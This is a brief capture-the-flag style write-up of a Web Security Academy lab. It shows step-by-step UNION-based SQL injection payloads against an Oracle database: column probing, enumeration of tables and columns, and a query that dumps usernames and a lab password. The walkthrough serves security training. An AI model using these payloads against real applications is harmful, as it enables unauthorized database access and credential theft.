SQL

Lab #10 in the SQL injection track of the Web Security Academy. This lab contains a SQL injection vulnerability in the product category field. To solve the lab, we perform a UNION based SQL injection attack on a Oracle database that retrieves the usernames and passwords of all users of the application.

Analysis
' Order By 1--
' Order By 3--  - Internal Server Error.

' UNION select 'NULL', 'NULL'--
' UNION select 'a', 'a'--
' UNION select 'a', 'a' from DUAL--

-> Oracle DB
both columns accept type text

Output the list of tables in db.
' UNION SELECT table_name, NULL FROM all_tables--

USERS_HVLIIE

Output the column names of the users table
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_HVLIIE'--

PASSWORD_FYIDRO
USERNAME_VBNBGG
Output the list of usernames/passwords

' UNION select USERNAME_VBNBGG, PASSWORD_FYIDRO from USERS_HVLIIE--

wc9fwu6pklfglynecpj4
administrator